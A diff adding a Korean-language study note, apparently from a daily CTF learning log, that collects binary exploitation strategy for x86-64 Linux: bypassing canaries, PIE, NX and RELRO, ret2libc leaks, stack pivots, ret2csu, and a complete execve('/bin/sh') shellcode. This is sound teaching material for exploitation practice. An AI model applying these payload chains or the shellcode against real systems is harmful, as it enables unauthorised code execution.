@@ -1,0 +1,974 @@
+# Day58 - Canary/PIE/libc/pivot 통합 체크리스트 + shellcode
+
+## 1. 목표
+
+Day58의 목표는 지금까지 배운 pwn exploit 흐름을 보호기법 기준으로 통합 정리하는 것이다.
+
+오늘 정리한 범위는 다음과 같다.
+
+* Canary / PIE / NX / RELRO 확인 후 exploit 전략 선택
+* FSB leak과 BOF를 함께 사용하는 흐름
+* ret2libc leak과 libc base 계산
+* `puts` leak과 `write` leak의 차이
+* NX OFF일 때 shellcode 전략
+* `execve("/bin/sh", 0, 0)` shellcode 레지스터
+* stack pivot 방식 비교
+* PIE / Canary / libc / pivot 복합 문제에서 자주 나는 실패 케이스
+
+---
+
+## 2. 보호기법 확인 후 1차 판단
+
+exploit을 시작할 때 가장 먼저 확인해야 할 보호기법은 다음 네 가지다.
+
+```text
+Canary
+PIE
+NX
+RELRO
+```
+
+각 보호기법별 판단 기준은 다음과 같다.
+
+```text
+Canary ON
+→ BOF 전에 canary leak이 가능한지 확인
+→ 가능하면 canary 원본을 payload에 보존
+→ 불가능하면 일반적인 saved RIP overwrite가 막힘
+
+PIE ON
+→ code pointer leak이 가능한지 확인
+→ 가능하면 pie_base = leak - known_offset
+→ 이후 gadget / GOT / PLT / .bss / function 주소를 모두 PIE base로 보정
+
+NX ON
+→ stack / heap / .bss shellcode 실행 불가
+→ ROP / ret2libc / ret2csu / stack pivot 사용
+
+NX OFF
+→ shellcode 실행 가능
+→ stack 또는 heap 주소 leak이 있으면 shellcode 전략 우선 고려 가능
+
+Full RELRO
+→ GOT overwrite 불가
+→ GOT read/leak/call은 가능
+```
+
+핵심은 보호기법을 단순히 확인하는 것이 아니라, 각 보호기법이 exploit 전략을 어떻게 바꾸는지 판단하는 것이다.
+
+---
+
+## 3. Canary 체크리스트
+
+Canary가 켜져 있으면 BOF로 saved RIP를 덮기 전에 canary를 반드시 통과해야 한다.
+
+일반적인 stack 구조는 다음과 같다.
+
+```text
+buffer
+canary
+saved rbp
+saved rip
+```
+
+payload 구조는 다음과 같아야 한다.
+
+```text
+padding_to_canary
+leaked_canary
+dummy_saved_rbp
+ROP chain
+```
+
+canary leak 후 확인할 점:
+
+```text
+canary & 0xff == 0
+```
+
+x86-64 Linux의 stack canary는 보통 least significant byte가 `0x00`이다. 따라서 leak한 값이 canary 후보인지 확인할 때 이 조건을 참고할 수 있다.
+
+### 실패 케이스: saved rbp dummy 누락
+
+잘못된 payload:
+
+```text
+padding
+canary
+pop rdi; ret
+binsh
+system
+```
+
+이렇게 하면 `pop rdi; ret`가 saved RIP가 아니라 saved RBP 자리에 들어간다.
+
+결과:
+
+```text
+saved rbp = pop rdi; ret
+saved rip = binsh
+```
+
+따라서 `binsh` 주소로 실행을 시도하게 되어 crash가 난다.
+
+정상 payload:
+
+```text
+padding
+canary
+dummy_saved_rbp
+pop rdi; ret
+binsh
+system
+```
+
+---
+
+## 4. PIE 체크리스트
+
+PIE가 켜져 있으면 objdump, nm, readelf, pwntools에서 보이는 binary 내부 주소는 실제 runtime 주소가 아니라 offset이다.
+
+따라서 code pointer leak이 필요하다.
+
+```text
+pie_base = leaked_code_pointer - known_offset
+```
+
+PIE base를 구한 뒤에는 다음 주소들을 모두 보정해야 한다.
+
+```text
+runtime_addr = pie_base + static_offset
+```
+
+PIE base를 더해야 하는 것:
+
+```text
+.text gadget
+.plt
+.got
+.bss
+function offset
+csu_pop offset
+csu_call offset
+ret gadget offset
+pop rdi; ret offset
+```
+
+PIE base를 더하면 안 되는 것:
+
+```text
+canary
+heap leak 주소
+stack leak 주소
+libc leak 주소
+단순 인자 상수
+이미 leak된 runtime 주소
+```
+
+예시:
+
+```text
+pie_leak = 0x5555555552d6
+main offset = 0x12d6
+
+pie_base = 0x5555555552d6 - 0x12d6
+         = 0x555555554000
+```
+
+이후:
+
+```text
+puts@plt runtime   = pie_base + puts@plt offset
+puts@got runtime   = pie_base + puts@got offset
+pop rdi runtime    = pie_base + pop rdi offset
+main runtime       = pie_base + main offset
+.bss slot runtime  = pie_base + .bss slot offset
+```
+
+### 실패 케이스: offset만 사용
+
+PIE ON 상태에서 `win_offset = 0x1234`만 payload에 넣으면 안 된다.
+
+```text
+잘못된 값: 0x1234
+정상 값: pie_base + 0x1234
+```
+
+offset은 binary 내부 상대 위치일 뿐이고, 실제 실행 주소가 아니다.
+
+---
+
+## 5. NX 체크리스트
+
+NX가 켜져 있으면 writable 영역에서 코드를 실행할 수 없다.
+
+```text
+stack shellcode 실행 불가
+heap shellcode 실행 불가
+.bss shellcode 실행 불가
+```
+
+하지만 ROP pivot은 가능하다.
+
+이유:
+
+```text
+.bss / heap에는 실행할 코드가 아니라 ROP 주소 목록만 둔다.
+ret가 그 주소들을 RIP로 꺼내고,
+실제 실행은 .text / .plt / libc 같은 r-x 영역에서 일어난다.
+```
+
+즉 fake stack은 code 영역이 아니라 ROP chain 저장 공간이다.
+
+---
+
+## 6. RELRO 체크리스트
+
+RELRO 상태에 따른 판단은 다음과 같다.
+
+```text
+No RELRO / Partial RELRO
+→ GOT overwrite 가능성 검토
+
+Full RELRO
+→ GOT overwrite 불가
+→ GOT leak/read/call은 가능
+```
+
+Full RELRO에서 가능한 것:
+
+```text
+puts(puts@got)
+write(1, puts@got, 8)
+ret2csu로 call [read@got]
+```
+
+Full RELRO에서 불가능한 것:
+
+```text
+puts@got = system
+exit@got = win
+printf@got = system
+```
+
+중요한 차이:
+
+```text
+[read@got] 값을 수정함 → Full RELRO에서 불가
+[read@got] 값을 읽어서 call함 → 가능
+```
+
+ret2csu에서 `r12 = read@got`을 넣는 것은 GOT overwrite가 아니라 GOT read + indirect call이다.
+
+---
+
+## 7. ret2libc 체크리스트
+
+NX ON이고 libc leak이 가능하면 ret2libc 전략을 사용할 수 있다.
+
+대표적인 1차 leak chain:
+
+```text
+pop rdi; ret
+puts@got
+puts@plt
+main
+```
+
+의미:
+
+```text
+puts(puts@got)
+→ puts@got 안에 들어있는 puts runtime 주소 출력
+→ main으로 복귀해서 같은 프로세스에서 2차 입력 받기
+```
+
+libc base 계산:
+
+```text
+libc_base = puts_runtime - puts_offset
+system    = libc_base + system_offset
+binsh     = libc_base + "/bin/sh" offset
+```
+
+2차 payload:
+
+```text
+padding
+canary
+dummy_saved_rbp
+ret                # stack alignment 필요 시
+pop rdi; ret
+binsh
+system
+```
+
+main으로 복귀하는 이유:
+
+```text
+같은 프로세스에서 추가 입력 기회를 얻기 위해서다.
+```
+
+프로그램이 종료되고 새로 실행되면 다음 값들이 다시 랜덤화된다.
+
+```text
+canary
+PIE base
+libc base
+stack 주소
+heap 주소
+```
+
+따라서 leak한 값을 유지하려면 같은 프로세스 안에서 2차 payload를 보내야 한다.
+
+---
+
+## 8. puts leak vs write leak
+
+### puts leak
+
+```text
+puts(puts@got)
+```
+
+장점:
+
+```text
+rdi 하나만 세팅하면 된다.
+```
+
+단점:
+
+```text
+puts는 문자열 출력 함수라서 \x00을 만나면 출력이 끊길 수 있다.
+```
+
+leak parsing 예시:
+
+```python
+leak = u64(p.recvline().strip().ljust(8, b"\x00"))
+```
+
+왜 `ljust(8, b"\x00")`를 쓰는가:
+
+```text
+x86-64 주소는 little endian으로 출력된다.
+낮은 바이트부터 먼저 오고,
+유저 영역 주소의 상위 바이트는 보통 \x00이다.
+```
+
+예시:
+
+```text
+raw leak:
+80 99 e1 f7 ff 7f
+
+복구:
+80 99 e1 f7 ff 7f 00 00
+
+u64:
+0x00007ffff7e19980
+```
+
+주의:
+
+```text
+raw bytes leak을 int(..., 16)으로 파싱하면 안 된다.
+ASCII hex 문자열일 때만 int(..., 16)을 쓴다.
+```
+
+raw leak은 다음처럼 파싱한다.
+
+```python
+puts_leak = u64(leak_line.rstrip(b"\n").ljust(8, b"\x00"))
+```
+
+### write leak
+
+```text
+write(1, puts@got, 8)
+```
+
+장점:
+
+```text
+정확히 8바이트를 leak할 수 있어 parsing이 안정적이다.
+```
+
+단점:
+
+```text
+rdi = 1
+rsi = puts@got
+rdx = 8
+```
+
+즉 인자 3개를 세팅해야 하므로 `pop rdx; ret`가 없으면 ret2csu가 필요할 수 있다.
+
+---
+
+## 9. system 내부 movaps crash
+
+2차 payload 구조가 맞고 `system` 진입 직후 SIGSEGV가 발생했으며, gdb에서 `movaps` 근처에서 터진다면 가장 먼저 stack alignment를 의심한다.
+
+확인:
+
+```gdb
+p/x (unsigned long)$rsp % 16
+```
+
+수정:
+
+```text
+system 전에 ret gadget 하나 추가
+```
+
+예시:
+
+```text
+padding
+canary
+dummy_saved_rbp
+ret
+pop rdi; ret
+binsh
+system
+```
+
+또는 이미 `ret`을 넣고 터졌다면 빼서 정렬을 반대로 바꿔본다.
+
+핵심:
+
+```text
+system 내부 movaps SIGSEGV = stack alignment 먼저 의심
+```
+
+`binsh` 주소가 틀린 경우와 구분해야 한다.
+
+---
+
+## 10. NX OFF shellcode 체크리스트
+
+NX OFF이고 stack 또는 heap 주소 leak이 있으면 shellcode 전략을 먼저 고려할 수 있다.
+
+조건:
+
+```text
+NX OFF
+shellcode 저장 위치 주소 leak
+입력 공간 충분
+bad character/filter 없음
+```
+
+ret2libc와 비교:
+
+```text
+ret2libc:
+libc leak → libc base 계산 → system/binsh 계산 → ROP 호출
+
+shellcode:
+buf 주소 leak → shellcode 삽입 → RIP를 buf로 이동
+```
+
+NX OFF + stack 주소 leak이 있으면 shellcode가 더 단순할 수 있다.
+
+---
+
+## 11. execve shellcode 레지스터
+
+`execve("/bin/sh", 0, 0)` syscall에 필요한 레지스터는 다음과 같다.
+
+```text
+rax = 59
+rdi = "/bin/sh" 주소
+rsi = 0
+rdx = 0
+syscall
+```
+
+대표 shellcode:
+
+```asm
+xor rsi, rsi
+push rsi
+mov rbx, 0x68732f6e69622f2f
+push rbx
+mov rdi, rsp
+xor rdx, rdx
+push 59
+pop rax
+syscall
+```
+
+`push rsi`를 먼저 하는 이유:
+
+```text
+rsi = 0이므로 stack에 8바이트 NULL을 먼저 올린다.
+그 다음 "//bin/sh"를 push하면 문자열 뒤에 NULL terminator가 붙는다.
+```
+
+stack 구조:
+
+```text
+rsp → "//bin/sh"
+      "\x00\x00\x00\x00\x00\x00\x00\x00"
+```
+
+이후:
+
+```text
+rdi = rsp
+```
+
+를 통해 `rdi`가 null-terminated `/bin/sh` 문자열을 가리키게 만든다.
+
+---
+
+## 12. pivot 방식 비교
+
+### leave; ret pivot
+
+동작:
+
+```text
+leave:
+rsp = rbp
+rbp = [rsp]
+rsp += 8
+
+ret:
+rip = [rsp]
+rsp += 8
+```
+
+fake stack 구조:
+
+```text
+[fake_stack]     = dummy rbp
+[fake_stack+8]   = first RIP
+[fake_stack+16]  = next value
+```
+
+특징:
+
+```text
+saved rbp를 fake_stack 주소로 덮고,
+saved rip를 leave; ret gadget으로 덮는다.
+```
+
+주의:
+
+```text
+[fake_stack]에 win 주소를 바로 넣으면 rbp = win이 될 뿐,
+win이 실행되는 것이 아니다.
+```
+
+---
+
+### xchg reg, rsp; ret pivot
+
+대표 형태:
+
+```text
+pop rax; ret
+fake_stack_addr
+xchg rax, rsp; ret
+```
+
+동작:
+
+```text
+rax = fake_stack_addr
+xchg rax, rsp
+rsp = fake_stack_addr
+ret → [fake_stack] 실행
+```
+
+fake stack 구조:
+
+```text
+[fake_stack]     = first RIP
+[fake_stack+8]   = next value
+```
+
+특징:
+
+```text
+dummy rbp가 필요 없다.
+```
+
+---
+
+### pop rsp; ret pivot
+
+동작:
+
+```text
+pop rsp
+ret → [new_rsp] 실행
+```
+
+payload 구조:
+
+```text
+padding
+pop rsp; ret
+fake_stack_addr
+```
+
+fake stack 구조:
+
+```text
+[fake_stack]     = first RIP
+[fake_stack+8]   = next value
+```
+
+특징:
+
+```text
+rsp를 직접 조작할 수 있으므로 강력하다.
+하지만 pop rsp gadget은 자주 나오지 않을 수 있다.
+```
+
+---
+
+### mov rsp, reg; ret pivot
+
+예:
+
+```text
+mov rsp, rax; ret
+```
+
+동작:
+
+```text
+rsp = rax
+ret → [rsp] 실행
+```
+
+fake stack 구조:
+
+```text
+[fake_stack]     = first RIP
+[fake_stack+8]   = next value
+```
+
+`xchg rax, rsp; ret`와 pivot 결과는 비슷하다.
+
+차이:
+
+```text
+xchg rax, rsp → rax와 rsp를 교환
+mov rsp, rax  → rsp만 rax 값으로 변경
+```
+
+---
+
+### add rsp, imm; ret
+
+예:
+
+```text
+add rsp, 0x28; ret
+```
+
+동작:
+
+```text
+rsp = rsp + 0x28
+ret → [rsp] 실행
+```
+
+특징:
+
+```text
+.bss나 heap 같은 새 fake stack으로 이동하는 방식이 아니다.
+현재 stack 안에서 일정 거리만큼 건너뛰는 방식이다.
+```
+
+용도:
+
+```text
+불필요한 stack 값 건너뛰기
+작은 stack pivot
+gadget 부작용으로 깨진 stack layout 보정
+ret sled처럼 원하는 위치까지 rsp 조정
+```
+
+---
+
+## 13. ret2csu 복합 체크리스트
+
+ret2csu를 사용할 때 핵심 구조는 다음과 같다.
+
+```text
+csu_pop:
+pop rbx
+pop rbp
+pop r12
+pop r13
+pop r14
+pop r15
+ret
+```
+
+```text
+csu_call:
+mov rdx, r15
+mov rsi, r14
+mov edi, r13d
+call [r12 + rbx*8]
+...
+add rsp, 8
+pop rbx
+pop rbp
+pop r12
+pop r13
+pop r14
+pop r15
+ret
+```
+
+인자 전달:
+
+```text
+r13d → edi/rdi
+r14  → rsi
+r15  → rdx
+```
+
+1회만 call하기 위한 값:
+
+```text
+rbx = 0
+rbp = 1
+```
+
+`csu_call` 이후 cleanup dummy:
+
+```text
+dummy 7개
+```
+
+이유:
+
+```text
+add rsp, 8      → dummy 1개 소비
+pop rbx         → dummy 1개
+pop rbp         → dummy 1개
+pop r12         → dummy 1개
+pop r13         → dummy 1개
+pop r14         → dummy 1개
+pop r15         → dummy 1개
+```
+
+총 7개가 필요하다.
+
+### PIE ON + ret2csu 주의
+
+PIE base를 더해야 하는 것:
+
+```text
+csu_pop
+csu_call
+read@got
+slot(.bss)
+win
+ret gadget
+```
+
+PIE base를 더하면 안 되는 것:
+
+```text
+arg1
+arg2
+arg3
+canary
+heap leak 주소
+stack leak 주소
+```
+
+### ret2csu staged call 예시
+
+1차 호출:
+
+```c
+read(0, slot, 8);
+```
+
+세팅:
+
+```text
+rbx = 0
+rbp = 1
+r12 = read@got
+r13 = 0
+r14 = slot
+r15 = 8
+```
+
+2차 호출:
+
+```c
+win(arg1, arg2, arg3);
+```
+
+단, `csu_call`은 `call [r12 + rbx*8]` 형태이므로 `r12 = win`이 아니다.
+
+먼저:
+
+```text
+[slot] = win
+```
+
+을 만들어야 한다.
+
+그 다음 2차 세팅:
+
+```text
+rbx = 0
+rbp = 1
+r12 = slot
+r13 = arg1
+r14 = arg2
+r15 = arg3
+```
+
+결과:
+
+```text
+call [slot]
+→ win(arg1, arg2, arg3)
+```
+
+---
+
+## 14. staged read 입력 체크
+
+`read(0, slot, 8)`이 실행된 후에는 정확히 8바이트를 보내야 한다.
+
+```python
+p.send(p64(win_runtime))
+```
+
+주의:
+
+```python
+p.sendline(p64(win_runtime))
+```
+
+은 newline을 추가하므로 다음 입력이나 흐름에 섞일 수 있다.
+
+추가로 PIE ON이면 보내야 하는 값은 `win_offset`이 아니라 `win_runtime`이다.
+
+```text
+잘못된 값: p64(win_offset)
+정상 값: p64(pie_base + win_offset)
+```
+
+---
+
+## 15. 최종 전략 선택표
+
+```text
+NX OFF + stack/heap 주소 leak 있음
+→ shellcode 우선 고려
+
+NX ON + libc leak 가능
+→ ret2libc
+
+NX ON + pop rdx 없음 / 인자 3개 필요
+→ ret2csu
+
+BOF 공간 작음
+→ stack pivot 필요
+
+PIE ON
+→ code pointer leak 후 PIE base 계산
+
+Canary ON
+→ canary leak 후 원본 보존
+
+Full RELRO
+→ GOT overwrite 금지
+→ GOT leak/read/call은 가능
+```
+
+---
+
+## 16. 복합 문제 전략 예시
+
+상황:
+
+```text
+Canary ON
+PIE ON
+NX ON
+Full RELRO
+FSB 있음
+BOF 있음
+puts@plt 있음
+puts@got 있음
+pop rdi; ret 있음
+main 복귀 가능
+```
+
+전략:
+
+```text
+1. FSB로 canary leak
+2. FSB로 PIE code pointer leak
+3. pie_base 계산
+4. BOF에서 canary 보존
+5. 1차 ROP로 puts(puts@got)
+6. libc_base 계산
+7. main 복귀
+8. 2차 BOF로 system("/bin/sh")
+```
+
+1차 payload:
+
+```text
+padding
+canary
+dummy_saved_rbp
+pop rdi; ret
+puts@got
+puts@plt
+main
+```
+
+2차 payload:
+
+```text
+padding
+canary
+dummy_saved_rbp
+ret
+pop rdi; ret
+binsh
+system
+```
+
+---
+
+## 17. 오늘 결론
+
+Day58의 핵심은 exploit을 “기법 이름”으로 고르는 것이 아니라, 보호기법과 leak 가능성에 따라 전략을 분기하는 것이다.
+
+정리하면 다음과 같다.
+
+```text
+Canary ON이면 canary leak과 보존이 먼저다.
+PIE ON이면 PIE base 계산 후 모든 binary 내부 주소를 보정해야 한다.
+NX ON이면 shellcode 대신 ROP/ret2libc/ret2csu/pivot을 사용한다.
+NX OFF이고 실행 위치 주소 leak이 있으면 shellcode가 단순할 수 있다.
+Full RELRO는 GOT overwrite를 막지만 GOT leak/read/call은 막지 않는다.
+BOF 공간이 작으면 pivot을 고려한다.
+leave; ret, xchg, pop rsp, mov rsp, add rsp 계열 pivot은 fake stack 구조가 다르다.
+libc leak 후 같은 프로세스에서 2차 입력을 받기 위해 main 복귀를 사용한다.
+system 내부 movaps crash는 stack alignment를 먼저 의심한다.
+```
+
+Day58은 Canary/PIE/libc/pivot/shellcode 전략을 하나의 exploit 판단 체크리스트로 통합한 날이다.
